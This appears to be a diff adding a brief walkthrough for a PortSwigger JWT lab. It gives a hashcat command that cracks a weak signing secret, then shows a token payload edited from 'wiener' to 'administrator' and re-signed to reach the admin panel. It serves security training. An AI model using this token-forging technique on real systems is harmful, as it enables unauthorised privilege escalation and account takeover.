@@ -1,0 +1,19 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
+
+After taking the session cookie and running the following command, we'll find the secret is "secret1" (For me it was):
+hashcat -a 0 -m 16500 <jwt> <wordlist>
+
+JWT Token payload Base 64 encoded:
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4OTcxMzYzMH0
+
+JWT Token payload Base 64 decoded:
+{"iss":"portswigger","sub":"wiener","exp":1689713630}
+
+JWT Token payload sub key value changed to administrator:
+{"iss":"portswigger","sub":"administrator","exp":1689713630}
+
+JWT Token payload Base 64 encoded:
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MTM2MzB9
+
+Replacing the old payload with the new payload above and signing the JWT token with "secret1" will give us access to the admin panel.
